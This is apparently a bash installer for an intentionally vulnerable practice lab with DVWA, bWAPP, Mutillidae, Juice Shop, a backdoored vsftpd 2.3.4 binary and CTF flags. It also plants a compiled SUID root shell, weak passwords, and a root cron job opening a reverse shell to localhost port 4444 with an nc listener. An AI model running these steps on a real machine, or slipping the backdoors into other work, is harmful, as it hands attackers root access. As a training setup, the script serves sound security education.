
#!/bin/bash
# Vuln Lab Universal Installer by dword32bit
# Supports re-run, reset, and repair. Ubuntu 20.04/22.04

set -e

MYSQL_ROOT_PW="rootpass"

log_info() {
  echo -e "\033[1;34m[+] $1\033[0m"
}

log_warn() {
  echo -e "\033[1;33m[!] $1\033[0m"
}

reset_mysql_password() {
  log_info "Fixing MySQL root access..."
  sudo mysql <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '${MYSQL_ROOT_PW}';
FLUSH PRIVILEGES;
EOF
}

check_and_install_node() {
  NODE_VERSION=$(node -v 2>/dev/null || echo "v0.0.0")
  if [[ "$NODE_VERSION" < "v14" ]]; then
    log_info "Installing Node.js 18.x (LTS)..."
    curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
    apt-get install -y nodejs
  fi
}

log_info "Installing dependencies..."
apt update && apt install -y apache2 php php-mysqli mariadb-server git unzip curl vsftpd openssh-server     nodejs npm netcat gcc g++ build-essential libcap2-bin

log_info "Starting MySQL..."
systemctl start mysql || service mysql start

log_info "Configuring MySQL root access..."
if ! mysql -uroot -p"${MYSQL_ROOT_PW}" -e "SELECT 1;" >/dev/null 2>&1; then
  reset_mysql_password
fi

log_info "Creating DVWA database and user..."
mysql -uroot -p${MYSQL_ROOT_PW} -e "DROP DATABASE IF EXISTS dvwa; CREATE DATABASE dvwa;"
mysql -uroot -p${MYSQL_ROOT_PW} -e "CREATE USER IF NOT EXISTS 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';"
mysql -uroot -p${MYSQL_ROOT_PW} -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"

log_info "Installing/Resetting DVWA..."
rm -rf /var/www/html/dvwa
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
sed -i "s/'root'/'dvwa'/; s/''/'p@ssw0rd'/" /var/www/html/dvwa/config/config.inc.php

log_info "Installing/Resetting bWAPP..."
rm -rf /var/www/html/bwapp
mkdir -p /var/www/html/bwapp
wget https://sourceforge.net/projects/bwapp/files/latest/download -O /tmp/bwapp.zip
unzip -o /tmp/bwapp.zip -d /var/www/html/bwapp
mv /var/www/html/bwapp/bWAPP/* /var/www/html/bwapp/
mysql -uroot -p${MYSQL_ROOT_PW} -e "DROP DATABASE IF EXISTS bwapp; CREATE DATABASE bwapp;"
mysql -uroot -p${MYSQL_ROOT_PW} -e "GRANT ALL ON bwapp.* TO 'dvwa'@'localhost';"

log_info "Installing/Resetting Mutillidae..."
rm -rf /var/www/html/mutillidae
git clone https://github.com/webpwnized/mutillidae.git /var/www/html/mutillidae

check_and_install_node

log_info "Installing/Resetting Juice Shop..."
rm -rf /opt/juice-shop
mkdir -p /opt/juice-shop
cd /opt/juice-shop
git clone https://github.com/bkimminich/juice-shop.git .
npm install --legacy-peer-deps || true
nohup npm start &

log_info "Installing/Resetting vsftpd 2.3.4 (backdoored)..."
wget https://github.com/andresriancho/vsftpd-2.3.4-backdoor/raw/master/vsftpd-2.3.4 -O /usr/sbin/vsftpd
chmod +x /usr/sbin/vsftpd
cat <<EOF > /etc/vsftpd.conf
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
EOF
useradd -M -s /bin/false ftpuser || true
echo "ftpuser:12345" | chpasswd
/usr/sbin/vsftpd &

log_info "Resetting SSH user..."
userdel -r hacker 2>/dev/null || true
useradd hacker -m -s /bin/bash
echo "hacker:hackme" | chpasswd

log_info "Creating SUID root shell..."
echo -e '#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0); system("/bin/bash"); return 0;}' > /tmp/rootshell.c
gcc /tmp/rootshell.c -o /usr/local/bin/rootshell
chmod 4755 /usr/local/bin/rootshell
rm /tmp/rootshell.c

log_info "Setting cron reverse shell..."
sed -i '/\/dev\/tcp\/127.0.0.1\/4444/d' /etc/crontab
echo "* * * * * root bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" >> /etc/crontab

log_info "Creating flags and logger..."
mkdir -p /opt/flags /var/tmp/.hidden /opt/scripts

echo "FLAG{dvwa_root_pwned}" > /opt/flags/flag1.txt
echo "FLAG{ftp_backdoor_triggered}" > /var/tmp/.hidden/ftp_flag.txt
echo "FLAG{juice_shop_xss}" | base64 > /opt/flags/juice_flag.b64
echo "FLAG{mysql_dump_success}" > /root/mysql_flag.txt
echo "FLAG{reverse_shell_callback}" > /opt/flags/rev_flag.txt

chmod 600 /opt/flags/*.txt /root/mysql_flag.txt
chmod 640 /var/tmp/.hidden/ftp_flag.txt
chown ftpuser:ftpuser /var/tmp/.hidden/ftp_flag.txt

cat <<EOF > /opt/scripts/log_score.sh
#!/bin/bash
echo "\$(date) - FLAG found: \$1 by user: \$(whoami)" >> /var/log/scoreboard.log
EOF
chmod +x /opt/scripts/log_score.sh

log_info "Starting reverse shell listener..."
pkill -f "nc -lvnp 4444" || true
nohup nc -lvnp 4444 > /opt/reverse_shell.log 2>&1 &

log_info "Restarting Apache and MySQL..."
systemctl restart apache2 mysql

echo ""
echo "✅ Vuln Lab is ready. Access:"
echo "  DVWA        → http://<IP>/dvwa"
echo "  bWAPP       → http://<IP>/bwapp"
echo "  Mutillidae  → http://<IP>/mutillidae"
echo "  Juice Shop  → http://<IP>:3000"
echo "  SUID Shell  → /usr/local/bin/rootshell"
echo "  RevShell    → nc -lvnp 4444 (localhost)"
echo ""
echo "💡 Re-run this script anytime to reset everything."
